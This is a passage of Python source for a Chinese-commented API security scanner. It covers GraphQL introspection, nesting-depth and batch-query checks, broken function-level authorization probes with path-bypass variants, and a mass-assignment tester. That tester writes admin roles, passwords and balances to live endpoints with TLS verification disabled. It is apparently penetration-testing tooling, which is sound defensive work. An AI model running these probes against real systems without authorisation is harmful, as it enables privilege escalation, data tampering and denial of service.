                        'mutation_type': schema.get('mutationType', {}).get('name', '无'),
                        'types_count': len(schema.get('types', [])),
                    }
                    result['details'] = f"内省查询成功! 发现 {result['schema']['types_count']} 个类型"
                    log_vuln("GraphQL内省查询已启用! 可获取完整Schema!")
                else:
                    result['details'] = "内省查询被禁用"
                    log_success("内省查询已禁用")
            else:
                result['details'] = f"HTTP {response.status_code}"
        except requests.RequestException as e:
            result['details'] = f"请求失败: {e}"
        except json.JSONDecodeError:
            result['details'] = "响应不是有效的JSON"

        return result

    def test_query_depth(self) -> Dict:
        """
        测试查询深度限制

        通过发送深度嵌套查询检测是否有深度限制。

        Returns:
            测试结果
        """
        log_info("测试查询深度限制...")
        result = {
            'test': '查询深度限制',
            'vulnerable': False,
            'details': '',
        }

        # 构造深度嵌套查询
        depth = 20
        nested = "user { " * depth + "id " + "} " * depth
        query = f"query {{ {nested} }}"

        payload = json.dumps({'query': query})

        try:
            response = self.session.post(
                self.url, data=payload, timeout=self.timeout,
                headers=self.headers, verify=False
            )

            if response.status_code == 200:
                data = response.json()
                if 'errors' in data:
                    result['vulnerable'] = False
                    result['details'] = "查询深度被限制"
                    log_success("查询深度已限制")
                else:
                    result['vulnerable'] = True
                    result['details'] = f"深度嵌套查询({depth}层)被接受"
                    log_vuln(f"查询深度未限制! {depth}层嵌套查询被接受")
        except requests.RequestException as e:
            result['details'] = f"请求失败: {e}"
        except json.JSONDecodeError:
            result['details'] = "响应不是有效的JSON"

        return result

    def test_batch_query(self) -> Dict:
        """
        测试批量查询攻击

        在一个请求中发送多个查询，检测是否有限制。

        Returns:
            测试结果
        """
        log_info("测试批量查询攻击...")
        result = {
            'test': '批量查询',
            'vulnerable': False,
            'details': '',
        }

        # 构造批量查询
        batch_queries = []
        for i in range(50):
            batch_queries.append({
                'query': '{ __typename }',
                'operationName': f'op{i}',
            })

        payload = json.dumps(batch_queries)

        try:
            response = self.session.post(
                self.url, data=payload, timeout=self.timeout,
                headers=self.headers, verify=False
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list) and len(data) == 50:
                        result['vulnerable'] = True
                        result['details'] = "批量查询(50个)被接受，可能导致DoS"
                        log_vuln("批量查询未限制! 可用于DoS攻击")
                    else:
                        result['details'] = "批量查询被限制"
                except json.JSONDecodeError:
                    result['details'] = "响应不是有效的JSON"
        except requests.RequestException as e:
            result['details'] = f"请求失败: {e}"

        return result

    def test_field_suggestion(self) -> Dict:
        """
        测试字段建议信息泄露

        当查询不存在的字段时，GraphQL可能返回建议信息。

        Returns:
            测试结果
        """
        log_info("测试字段建议信息泄露...")
        result = {
            'test': '字段建议',
            'vulnerable': False,
            'details': '',
        }

        query = '{ nonexistentField }'
        payload = json.dumps({'query': query})

        try:
            response = self.session.post(
                self.url, data=payload, timeout=self.timeout,
                headers=self.headers, verify=False
            )

            if response.status_code == 200:
                data = response.json()
                if 'errors' in data:
                    error_msg = str(data['errors'])
                    if 'Did you mean' in error_msg or 'did you mean' in error_msg:
                        result['vulnerable'] = True
                        result['details'] = f"字段建议信息泄露: {error_msg[:100]}"
                        log_warn("字段建议信息泄露")
                    else:
                        result['details'] = "无字段建议信息泄露"
        except requests.RequestException as e:
            result['details'] = f"请求失败: {e}"
        except json.JSONDecodeError:
            result['details'] = "响应不是有效的JSON"

        return result

    def test_all(self) -> Dict:
        """执行全面的GraphQL安全测试"""
        log_info(f"开始GraphQL安全测试: {self.url}")

        results = {
            'url': self.url,
            'tests': [
                self.test_introspection(),
                self.test_query_depth(),
                self.test_batch_query(),
                self.test_field_suggestion(),
            ],
            'timestamp': datetime.now().isoformat(),
        }

        vuln_count = sum(1 for t in results['tests'] if t.get('vulnerable'))
        results['vulnerabilities_found'] = vuln_count

        return results


# ============================================================================
# 模块6：损坏的功能级授权（BFLA）测试
# ============================================================================

class BFLATester:
    """
    损坏的功能级授权（BFLA）测试器

    检测API是否正确实施功能级授权：
    - 普通用户能否访问管理员端点
    - HTTP方法越权
    - 路径参数绕过
    """

    # 常见管理员端点
    ADMIN_ENDPOINTS = [
        '/admin', '/admin/users', '/admin/settings', '/admin/config',
        '/admin/dashboard', '/admin/logs', '/admin/system',
        '/api/admin', '/api/admin/users', '/api/admin/settings',
        '/management', '/manage', '/console', '/control',
    ]

    # HTTP方法越权测试
    HTTP_METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']

    def __init__(self, base_url: str, **kwargs):
        """
        初始化BFLA测试器

        Args:
            base_url: API基础URL
            kwargs: 额外配置
        """
        self.base_url = base_url.rstrip('/')
        self.token = kwargs.get('token', '')
        self.timeout = kwargs.get('timeout', Config.TIMEOUT)
        self.headers = kwargs.get('headers', {})
        if self.token:
            self.headers['Authorization'] = f'Bearer {self.token}'
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': Config.USER_AGENT})

    def test_admin_endpoints(self) -> Dict:
        """
        测试管理员端点授权

        使用普通用户token访问管理员端点。

        Returns:
            测试结果
        """
        log_info("测试管理员端点授权...")
        result = {
            'test': '管理员端点授权',
            'vulnerable': False,
            'findings': [],
        }

        for endpoint in self.ADMIN_ENDPOINTS:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(
                    url, timeout=self.timeout,
                    headers=self.headers, verify=False
                )

                # 200表示普通用户可以访问管理员端点
                if response.status_code == 200:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'endpoint': endpoint,
                        'status_code': 200,
                        'issue': '普通用户可访问管理员端点',
                        'severity': '高危',
                    })
                    log_vuln(f"BFLA: 普通用户可访问 {endpoint}")
                elif response.status_code == 403:
                    pass  # 正确拒绝
                elif response.status_code == 401:
                    pass  # 需要认证
            except requests.RequestException:
                continue

        if not result['vulnerable']:
            result['findings'].append({'message': '管理员端点授权正确'})

        return result

    def test_method_override(self) -> Dict:
        """
        测试HTTP方法越权

        尝试不同的HTTP方法访问端点，检测是否有方法级授权。

        Returns:
            测试结果
        """
        log_info("测试HTTP方法越权...")
        result = {
            'test': 'HTTP方法越权',
            'vulnerable': False,
            'findings': [],
        }

        # 测试端点列表（从发现模块获取或使用默认）
        test_endpoints = ['/api/users', '/api/users/1', '/api/settings']
        test_url = urljoin(self.base_url, test_endpoints[0])

        for method in self.HTTP_METHODS:
            try:
                response = self.session.request(
                    method, test_url,
                    timeout=self.timeout,
                    headers=self.headers, verify=False
                )

                # 检查DELETE等危险方法是否被正确限制
                if method in ['DELETE', 'PUT', 'PATCH'] and response.status_code == 200:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'endpoint': test_endpoints[0],
                        'method': method,
                        'status_code': response.status_code,
                        'issue': f'{method}方法未正确限制',
                        'severity': '中危',
                    })
                    log_warn(f"BFLA: {method}方法未被限制于 {test_endpoints[0]}")
            except requests.RequestException:
                continue

        if not result['vulnerable']:
            result['findings'].append({'message': 'HTTP方法授权正确'})

        return result

    def test_path_bypass(self) -> Dict:
        """
        测试路径绕过

        通过路径变形绕过授权检查。

        Returns:
            测试结果
        """
        log_info("测试路径绕过...")
        result = {
            'test': '路径绕过',
            'vulnerable': False,
            'findings': [],
        }

        # 路径变形测试
        path_variants = [
            '/api/admin/users',
            '/api/admin/users/',
            '/api/admin/../admin/users',
            '/api/Admin/users',
            '/api/ADMIN/users',
            '/api/admin%2fusers',
            '/api/admin/users%00',
            '/api/admin/users;.js',
            '/api/admin/users?parameter=value',
            '//api/admin/users',
            '/api/admin/users/admin',
        ]

        for path in path_variants:
            url = urljoin(self.base_url, path)
            try:
                response = self.session.get(
                    url, timeout=self.timeout,
                    headers=self.headers, verify=False
                )

                if response.status_code == 200:
                    # 检查是否返回了实际数据
                    try:
                        data = response.json()
                        if data and not isinstance(data, dict) or 'error' not in str(data).lower():
                            result['vulnerable'] = True
                            result['findings'].append({
                                'path': path,
                                'status_code': 200,
                                'issue': '路径变形绕过授权检查',
                                'severity': '高危',
                            })
                            log_vuln(f"BFLA: 路径绕过成功: {path}")
                    except json.JSONDecodeError:
                        pass
            except requests.RequestException:
                continue

        if not result['vulnerable']:
            result['findings'].append({'message': '路径绕过测试通过'})

        return result

    def test_all(self) -> Dict:
        """执行全面的BFLA测试"""
        log_info(f"开始BFLA测试: {self.base_url}")

        results = {
            'base_url': self.base_url,
            'tests': [
                self.test_admin_endpoints(),
                self.test_method_override(),
                self.test_path_bypass(),
            ],
            'timestamp': datetime.now().isoformat(),
        }

        vuln_count = sum(1 for t in results['tests'] if t.get('vulnerable'))
        results['vulnerabilities_found'] = vuln_count

        return results


# ============================================================================
# 模块7：批量赋值漏洞测试
# ============================================================================

class MassAssignmentTester:
    """
    批量赋值（Mass Assignment）漏洞测试器

    检测API是否将用户提交的参数直接绑定到对象属性，
    导致可修改非授权字段（如isAdmin/role/password等）。
    """

    # 敏感字段测试payload
    SENSITIVE_FIELDS = {
        'isAdmin': [True, 'true', 1, '1'],
        'admin': [True, 'true', 1],
        'role': ['admin', 'administrator', 'superuser', 'root', 'manager'],
        'is_admin': [True, 'true', 1],
        'is_superuser': [True, 'true', 1],
        'is_staff': [True, 'true', 1],
        'is_active': [True],
        'verified': [True, 'true'],
        'email_verified': [True, 'true'],
        'account_type': ['admin', 'premium', 'vip'],
        'permissions': ['*'],
        'user_type': ['admin'],
        'verified_at': [datetime.now().isoformat()],
        'password': ['NewPassword123!'],
        'password_hash': ['$2b$12$newhash...'],
        'salary': [9999999],
        'balance': [9999999],
        'credit_limit': [9999999],
        'id': [1, 0],
        'user_id': [1, 0],
        'owner_id': [1, 0],
    }

    def __init__(self, base_url: str, **kwargs):
        """
        初始化批量赋值测试器

        Args:
            base_url: API基础URL
            kwargs: 额外配置
        """
        self.base_url = base_url.rstrip('/')
        self.token = kwargs.get('token', '')
        self.timeout = kwargs.get('timeout', Config.TIMEOUT)
        self.headers = kwargs.get('headers', {})
        if self.token:
            self.headers['Authorization'] = f'Bearer {self.token}'
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': Config.USER_AGENT,
            'Content-Type': 'application/json',
        })

    def test_update_endpoint(self, endpoint: str, method: str = 'PUT') -> Dict:
        """
        测试更新端点的批量赋值漏洞

        Args:
            endpoint: API端点
            method: HTTP方法

        Returns:
            测试结果
        """
        log_info(f"测试批量赋值漏洞: {endpoint}")
        result = {
            'test': '批量赋值',
            'endpoint': endpoint,
            'method': method,
            'vulnerable': False,
            'findings': [],
        }

        # 首先获取原始数据
        url = urljoin(self.base_url, endpoint)
        try:
            original_response = self.session.get(
                url, timeout=self.timeout,
                headers=self.headers, verify=False
            )
            if original_response.status_code != 200:
                result['details'] = f"无法获取原始数据 (HTTP {original_response.status_code})"
                return result

            original_data = original_response.json()
        except Exception as e:
            result['details'] = f"获取原始数据失败: {e}"
            return result

        # 尝试注入敏感字段
        for field, values in self.SENSITIVE_FIELDS.items():
            for value in values:
                # 构造更新payload
                update_data = {field: value}

                try:
                    if method.upper() == 'PUT':
                        # PUT通常需要完整对象
                        test_data = original_data.copy()
                        test_data[field] = value
                    else:
                        # PATCH只发送修改的字段
                        test_data = update_data

                    response = self.session.request(
                        method, url, json=test_data,
                        timeout=self.timeout,
                        headers=self.headers, verify=False
                    )

                    if response.status_code in [200, 201, 204]:
                        # 检查字段是否被成功修改
                        try:
                            updated_data = response.json() if response.text else {}
                            verify_response = self.session.get(
                                url, timeout=self.timeout,
                                headers=self.headers, verify=False
                            )
                            verified_data = verify_response.json()

                            if verified_data.get(field) == value:
                                result['vulnerable'] = True
                                result['findings'].append({
                                    'field': field,
                                    'value': value,
                                    'severity': '高危',
                                    'issue': f'成功修改敏感字段 {field}',
                                })
                                log_vuln(f"批量赋值漏洞! 字段 {field} 可被修改为 {value}")
                                break  # 字段已被确认可修改，跳过其他值
                        except Exception:
                            pass

                except requests.RequestException:
                    continue

        if not result['vulnerable']:
            result['details'] = '未发现批量赋值漏洞'

        return result

    def test_all(self, endpoints: List[str] = None) -> Dict:
        """
        执行全面的批量赋值测试

        Args:
            endpoints: 要测试的端点列表

        Returns:
            测试结果
        """
        if endpoints is None:
            endpoints = ['/api/users/1', '/api/profile', '/api/account']

        log_info(f"开始批量赋值测试: {self.base_url}")

        results = {
            'base_url': self.base_url,
            'endpoints_tested': endpoints,
            'tests': [],
            'timestamp': datetime.now().isoformat(),
        }

        for endpoint in endpoints:
            for method in ['PUT', 'PATCH']:
                test_result = self.test_update_endpoint(endpoint, method)
                results['tests'].append(test_result)

        vuln_count = sum(1 for t in results['tests'] if t.get('vulnerable'))
        results['vulnerabilities_found'] = vuln_count

        return results


# ============================================================================
# 主函数与CLI接口
# ============================================================================

def main():
    """主函数 - CLI入口"""
    parser = argparse.ArgumentParser(
        description='API安全扫描器 - RESTful API安全测试工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例用法:
  %(prog)s discover -u http://api.example.com
  %(prog)s jwt -t "eyJhbGciOiJIUzI1NiIs..."
  %(prog)s jwt -t "eyJ..." -u http://api.example.com/protected
  %(prog)s oauth -c http://auth.example.com --client-id test
  %(prog)s ratelimit -u http://api.example.com/endpoint -n 100
  %(prog)s graphql -u http://api.example.com/graphql
  %(prog)s bfla -u http://api.example.com --token "Bearer xxx"
  %(prog)s massassign -u http://api.example.com --token "Bearer xxx"

免责声明: 仅用于授权的安全测试！
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='可用命令')

    # 端点发现
    discover_parser = subparsers.add_parser('discover', help='API端点发现')
    discover_parser.add_argument('-u', '--url', required=True, help='API基础URL')

    # JWT分析
    jwt_parser = subparsers.add_parser('jwt', help='JWT令牌分析')
    jwt_parser.add_argument('-t', '--token', required=True, help='JWT令牌')
    jwt_parser.add_argument('-u', '--url', help='验证URL（用于测试alg=none等）')

    # OAuth测试
    oauth_parser = subparsers.add_parser('oauth', help='OAuth 2.0流程测试')
    oauth_parser.add_argument('-c', '--auth-server', required=True, help='授权服务器URL')
    oauth_parser.add_argument('--client-id', default='test_client', help='客户端ID')
    oauth_parser.add_argument('--redirect-uri', default='https://example.com/callback',
                             help='重定向URI')

    # 速率限制测试
    rate_parser = subparsers.add_parser('ratelimit', help='API速率限制测试')
    rate_parser.add_argument('-u', '--url', required=True, help='API端点URL')
    rate_parser.add_argument('-n', '--num-requests', type=int, default=100, help='请求数量')
    rate_parser.add_argument('-t', '--threads', type=int, default=Config.MAX_THREADS, help='线程数')

    # GraphQL测试
    graphql_parser = subparsers.add_parser('graphql', help='GraphQL内省查询测试')
    graphql_parser.add_argument('-u', '--url', required=True, help='GraphQL端点URL')

    # BFLA测试
    bfla_parser = subparsers.add_parser('bfla', help='损坏的功能级授权（BFLA）测试')
    bfla_parser.add_argument('-u', '--url', required=True, help='API基础URL')
    bfla_parser.add_argument('--token', help='Bearer令牌')

    # 批量赋值测试
    mass_parser = subparsers.add_parser('massassign', help='批量赋值漏洞测试')
    mass_parser.add_argument('-u', '--url', required=True, help='API基础URL')
    mass_parser.add_argument('--token', help='Bearer令牌')
    mass_parser.add_argument('--endpoints', nargs='+', default=['/api/users/1', '/api/profile'],
                             help='测试端点列表')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    # 禁用SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if args.command == 'discover':
        discovery = APIEndpointDiscovery(args.url)
        result = discovery.discover_all()
        print(f"\n发现 {result['endpoints_found']} 个端点")
        for doc in result['docs_found']:
            print(f"  文档: {doc['url']} ({doc['type']})")

    elif args.command == 'jwt':
        analyzer = JWTAnalyzer(args.token, url=args.url)
        result = analyzer.analyze_all()
        print(f"\n分析完成，发现 {result['vulnerabilities_found']} 个漏洞")

    elif args.command == 'oauth':
        tester = OAuthTester(args.auth_server, client_id=args.client_id,
                             redirect_uri=args.redirect_uri)
        result = tester.test_all()
        print(f"\nOAuth测试完成，发现 {result['vulnerabilities_found']} 个漏洞")

    elif args.command == 'ratelimit':
        tester = RateLimitTester(args.url, max_requests=args.num_requests,
                                 threads=args.threads)
        result = tester.test_rate_limit()
        print(f"\n速率限制: {'已实施' if result['rate_limited'] else '未实施'}")
        print(f"状态码分布: {result['status_distribution']}")
        print(f"平均响应时间: {result['avg_response_time']}")

    elif args.command == 'graphql':
        tester = GraphQLTester(args.url)
        result = tester.test_all()
        print(f"\nGraphQL测试完成，发现 {result['vulnerabilities_found']} 个漏洞")

    elif args.command == 'bfla':
        tester = BFLATester(args.url, token=args.token)
        result = tester.test_all()
        print(f"\nBFLA测试完成，发现 {result['vulnerabilities_found']} 个漏洞")

    elif args.command == 'massassign':
        tester = MassAssignmentTester(args.url, token=args.token)
        result = tester.test_all(args.endpoints)
        print(f"\n批量赋值测试完成，发现 {result['vulnerabilities_found']} 个漏洞")

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
